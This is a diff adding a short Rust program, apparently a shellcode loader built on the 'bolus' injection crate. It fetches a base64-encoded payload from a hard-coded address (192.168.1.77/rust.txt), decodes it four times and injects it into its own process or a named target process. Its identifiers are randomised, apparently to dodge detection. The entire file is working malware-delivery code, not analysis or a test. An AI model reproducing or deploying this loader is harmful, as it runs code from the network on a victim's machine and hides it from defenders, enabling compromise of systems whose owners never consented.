@@ -1,0 +1,38 @@
+extern crate bolus;
+
+use bolus::{
+    inject,
+    injectors::{InjectionType, InjectorType},
+    load,
+};
+
+/// The BL7IJA_RIUNWGDHVPPMPDQ where shellcode will be downloaded from
+const BL7IJA_RIUNWGDHVPPMPDQ: &str = "http://192.168.1.77:80/rust.txt";
+/// The # of base64 iterations to decode
+const _25YXMIZNYP9FH28WOUREYQ: usize = 4;
+/// If not blank, the process name to inject into
+const CATHIOZC8WWUQJIL3NFYWW: &str = "";
+/// WaitForSingleObject Switch. Usually you want this
+const BHQ2OPT1XCQXQ0JL_BFANG: bool = true;
+/// IgnoreSSL switch. You know what this does.
+const H4YZJHU7I912_8ARBEC1QG: bool = false;
+
+fn main() -> Result<(), String> {
+    let _8knvanf4jyvmjzdhr9wmma = match CATHIOZC8WWUQJIL3NFYWW {
+        "" => InjectionType::Reflect,
+        _ => InjectionType::Remote(CATHIOZC8WWUQJIL3NFYWW.to_string()),
+    };
+    let cinf4uv8hg7dom9myt5bcq = load(
+        InjectorType::Base64Url((
+            BL7IJA_RIUNWGDHVPPMPDQ.to_string(),
+            H4YZJHU7I912_8ARBEC1QG,
+            _25YXMIZNYP9FH28WOUREYQ
+        ))
+    )?;
+    inject(
+        cinf4uv8hg7dom9myt5bcq,
+        _8knvanf4jyvmjzdhr9wmma,
+        BHQ2OPT1XCQXQ0JL_BFANG
+    )
+}
+
